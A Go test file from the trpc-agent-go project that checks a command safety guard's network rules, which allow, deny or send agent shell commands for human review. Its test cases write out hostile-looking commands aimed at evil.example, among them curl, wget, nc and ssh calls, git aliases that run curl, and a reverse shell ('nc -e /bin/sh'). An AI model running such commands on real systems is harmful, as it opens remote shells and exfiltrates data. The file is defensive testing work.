//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"runtime"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestNetworkRuleClassifiesNonURLTargets(t *testing.T) {
	guard := newNetworkTestGuard(t)
	tests := []struct {
		name     string
		command  string
		decision Decision
		ruleID   string
	}{
		{"curl denied", "curl evil.example", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"curl tab denied", "curl\tevil.example", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"curl absolute path denied", "/usr/bin/curl evil.example", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"curl uppercase denied", "CURL evil.example", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"curl exe denied", "curl.exe evil.example", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"curl allowed", "curl api.github.com/path", DecisionAllow, "SAFETY_NO_FINDINGS"},
		{"curl combined flags", "curl -fsS api.github.com/path", DecisionAllow, "SAFETY_NO_FINDINGS"},
		{"wget denied", "wget evil.example/file", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"wget tab denied", "wget\tevil.example/file", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"ssh denied", "ssh user@evil.example", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"ssh allowed", "ssh api.github.com", DecisionAllow, "SAFETY_NO_FINDINGS"},
		{"scp denied", "scp file user@evil.example:/tmp/file", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"scp allowed", "scp user@api.github.com:/tmp/file .", DecisionAllow, "SAFETY_NO_FINDINGS"},
		{"nc denied", "nc evil.example 443", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"nc allowed", "nc api.github.com 443", DecisionAllow, "SAFETY_NO_FINDINGS"},
		{"ncat denied", "ncat evil.example 443", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"netcat denied", "netcat evil.example 443", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"git clone denied", "git clone https://evil.example/repo", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"git clone scp denied", "git clone git@evil.example:/repo", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"git clone allowed domain review", "git clone https://api.github.com/repo", DecisionNeedsHumanReview, "NETWORK_OPTION_REVIEW"},
		{"git status local", "git status", DecisionAllow, "SAFETY_NO_FINDINGS"},
		{"IP literal", "curl 192.0.2.1", DecisionDeny, "NETWORK_IP_LITERAL"},
		{"curl text is not execution", `grep "curl " README.md`, DecisionAllow, "SAFETY_NO_FINDINGS"},
		{"URL text is not execution", `grep "https://evil.example" README.md`, DecisionAllow, "SAFETY_NO_FINDINGS"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			report, err := guard.Scan(context.Background(), scanCommand(test.command))
			require.NoError(t, err)
			require.Equal(t, test.decision, report.Decision)
			requireNetworkRule(t, report, test.ruleID)
		})
	}
}

func TestNetworkRuleFailsClosedForAmbiguousTargets(t *testing.T) {
	guard := newNetworkTestGuard(t)
	tests := []struct {
		name    string
		command string
		ruleID  string
	}{
		{"curl redirect", "curl -L https://api.github.com/x", "NETWORK_OPTION_REVIEW"},
		{"curl combined redirect", "curl -fsSL https://api.github.com/x", "NETWORK_OPTION_REVIEW"},
		{"ssh config override", "ssh -o HostName=evil.example api.github.com", "NETWORK_OPTION_REVIEW"},
		{"scp transport override", "scp -S custom file user@api.github.com:/x", "NETWORK_OPTION_REVIEW"},
		{"git curl alias", `git -c alias.x='!curl evil.example' x`, "NETWORK_OPTION_REVIEW"},
		{"git nc alias", `git -c alias.x='!nc evil.example 443' x`, "NETWORK_OPTION_REVIEW"},
		{"git persisted alias", "git x", "NETWORK_OPTION_REVIEW"},
		{"git fetch update flag", "git fetch -u evil.example:/repo api.github.com", "NETWORK_DOMAIN_DENIED"},
		{"git push update flag", "git push -u evil.example:/repo api.github.com", "NETWORK_DOMAIN_DENIED"},
		{"git remote update", "git remote update", "NETWORK_OPTION_REVIEW"},
		{"git remote show", "git remote show origin", "NETWORK_OPTION_REVIEW"},
		{"git remote prune", "git remote prune origin", "NETWORK_OPTION_REVIEW"},
		{"git remote archive", "git archive --remote evil.example:/repo HEAD", "NETWORK_DOMAIN_DENIED"},
		{"git archive repeated remote", "git archive --remote=api.github.com --remote=evil.example HEAD", "NETWORK_DOMAIN_DENIED"},
		{"git push repeated repo", "git push --repo=api.github.com --repo=evil.example", "NETWORK_DOMAIN_DENIED"},
		{"git repository config", "git -C repo fetch https://api.github.com/x", "NETWORK_OPTION_REVIEW"},
		{"nc listener", "nc -l 4444", "NETWORK_OPTION_REVIEW"},
		{"dynamic target", "curl $TARGET", "NETWORK_TARGET_UNPARSEABLE"},
		{"unknown client target", "custom-fetch evil.example", "NETWORK_TARGET_UNPARSEABLE"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			report, err := guard.Scan(context.Background(), scanCommand(test.command))
			require.NoError(t, err)
			require.NotEqual(t, DecisionAllow, report.Decision)
			requireFinding(t, report, test.ruleID)
		})
	}
}

func TestNetworkRuleChecksAllowedCustomDownloader(t *testing.T) {
	guard := newNetworkTestGuard(t)
	tests := []struct {
		command  string
		decision Decision
		ruleID   string
	}{
		{"fetcher https://evil.example/file", DecisionDeny, "NETWORK_DOMAIN_DENIED"},
		{"fetcher https://api.github.com/file", DecisionAsk, "NETWORK_CUSTOM_CLIENT"},
	}
	for _, test := range tests {
		report, err := guard.Scan(context.Background(), scanCommand(test.command))
		require.NoError(t, err)
		require.Equal(t, test.decision, report.Decision)
		requireFinding(t, report, test.ruleID)
	}
}

func TestNetworkRuleNormalizesWindowsCommandSuffixes(t *testing.T) {
	guard := newNetworkTestGuard(t)
	for _, suffix := range []string{".exe", ".cmd", ".bat", ".com", ".ps1"} {
		report, err := guard.Scan(
			context.Background(), scanCommand("curl"+suffix+" evil.example"),
		)
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision)
		if runtime.GOOS == "windows" || suffix == ".exe" {
			requireFinding(t, report, "NETWORK_DOMAIN_DENIED")
			continue
		}
		requireFinding(t, report, "CMD_NOT_ALLOWED")
	}
}

func TestNetworkRuleChecksEveryLiteralTarget(t *testing.T) {
	guard := newNetworkTestGuard(t)
	report, err := guard.Scan(
		context.Background(),
		scanCommand("curl api.github.com evil.example"),
	)
	require.NoError(t, err)
	require.Equal(t, DecisionDeny, report.Decision)
	requireFinding(t, report, "NETWORK_DOMAIN_DENIED")
}

func TestNetworkRuleReviewOptionsDoNotHideDeniedTargets(t *testing.T) {
	guard := newNetworkTestGuard(t)
	commands := []string{
		"curl -L evil.example",
		"ssh -J api.github.com evil.example",
		"nc -e /bin/sh evil.example 443",
	}
	for _, command := range commands {
		report, err := guard.Scan(context.Background(), scanCommand(command))
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision, command)
		requireFinding(t, report, "NETWORK_DOMAIN_DENIED")
		requireFinding(t, report, "NETWORK_OPTION_REVIEW")
	}
}

func TestNetworkRuleChecksSSHRemoteCommand(t *testing.T) {
	guard := newNetworkTestGuard(t)
	report, err := guard.Scan(
		context.Background(),
		scanCommand("ssh api.github.com nc evil.example 443"),
	)
	require.NoError(t, err)
	require.Equal(t, DecisionDeny, report.Decision)
	requireFinding(t, report, "NETWORK_DOMAIN_DENIED")
}

func TestNetworkRuleReviewsSSHRemoteShellWrapper(t *testing.T) {
	guard := newNetworkTestGuard(t)
	commands := []string{
		`ssh api.github.com bash -c "nc evil.example 443"`,
		`ssh api.github.com sh -c "curl evil.example"`,
	}
	for _, command := range commands {
		report, err := guard.Scan(context.Background(), scanCommand(command))
		require.NoError(t, err)
		require.NotEqual(t, DecisionAllow, report.Decision)
		requireFinding(t, report, "NETWORK_OPTION_REVIEW")
	}
}

func TestNetworkRuleHandlesSCPDrivePathByPlatform(t *testing.T) {
	guard := newNetworkTestGuard(t)
	report, err := guard.Scan(
		context.Background(),
		scanCommand("scp c:/tmp/file user@api.github.com:/tmp/file"),
	)
	require.NoError(t, err)
	if runtime.GOOS == "windows" {
		require.Equal(t, DecisionAllow, report.Decision)
		return
	}
	require.Equal(t, DecisionDeny, report.Decision)
	requireFinding(t, report, "NETWORK_DOMAIN_DENIED")
}

func TestNetworkRuleChecksNonHTTPProxyTargets(t *testing.T) {
	guard := newNetworkTestGuard(t)
	values := []string{"evil.example:8080", "socks5://evil.example:1080"}
	for _, value := range values {
		input := scanCommand("go version")
		input.Env = map[string]string{"HTTPS_PROXY": value}
		report, err := guard.Scan(context.Background(), input)
		require.NoError(t, err)
		require.Equal(t, DecisionDeny, report.Decision)
		requireFinding(t, report, "NETWORK_DOMAIN_DENIED")
	}
}

func newNetworkTestGuard(t *testing.T) *Guard {
	t.Helper()
	policy := DefaultPolicy()
	policy.allowedCommands = []string{
		"go", "git", "grep", "curl", "wget", "ssh", "scp", "nc", "ncat", "netcat",
		"custom-fetch", "fetcher",
	}
	policy.deniedCommands = nil
	policy.allowedDomains = []string{"api.github.com"}
	guard, err := NewGuard(policy)
	require.NoError(t, err)
	return guard
}

func requireNetworkRule(t *testing.T, report Report, ruleID string) {
	t.Helper()
	if ruleID == "SAFETY_NO_FINDINGS" {
		require.Equal(t, ruleID, report.RuleID)
		return
	}
	requireFinding(t, report, ruleID)
}
